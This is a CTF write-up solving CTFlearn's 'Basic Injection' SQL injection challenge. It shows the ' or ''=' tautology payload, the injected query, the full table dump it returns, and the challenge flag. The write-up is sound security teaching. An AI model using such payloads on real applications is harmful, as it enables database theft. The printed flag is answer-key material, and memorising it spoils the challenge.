# Basic Injection

See if you can leak the whole database using what you know about SQL Injections. [link](https://web.ctflearn.com/web4/)

Don't know where to begin? Check out CTFlearn's SQL Injection Lab

## Solution
Try random input

```
Original Query: SELECT * FROM webfour.webfour where name = '$input'
Your Resulting Query: SELECT * FROM webfour.webfour where name = 'asa'
0 results
```

Look over the source code:
```html
<!-- Try some names like Hiroki, Noah, Luke -->
		<div class="row">
			<div class="col l4 push-l4">
	<p>Original Query: SELECT * FROM webfour.webfour where name = '$input'</p>
	<p>Your Resulting Query: SELECT * FROM webfour.webfour where name = 'asa'	</p>		
	<p>
``` 

Try to input them all, and only "Luke" that have result.
```
Original Query: SELECT * FROM webfour.webfour where name = '$input'
Your Resulting Query: SELECT * FROM webfour.webfour where name = 'Luke'
Name: Luke
Data: I made this problem.
```

In SQL Injection theory, this will create the following SQL request:
```sql
SELECT * FROM Users WHERE Name ="" or ""="" AND Pass ="" or ""=""
```
This would then return all of the users and passwords stored.

After trying ‘ or ‘’=‘, the site rewarded me with all of the contents in the database.

```
Original Query: SELECT * FROM webfour.webfour where name = '$input'

Your Resulting Query: SELECT * FROM webfour.webfour where name = '' or ''=''

Name: Luke
Data: I made this problem.
Name: Alec
Data: Steam boys.
Name: Jalen
Data: Pump that iron fool.
Name: Eric
Data: I make cars.
Name: Sam
Data: Thinks he knows SQL.
Name: fl4g__giv3r
Data: CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}
Name: snoutpop
Data: jowls
Name: Chunbucket
Data: @datboiiii
```
## Flag
    CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}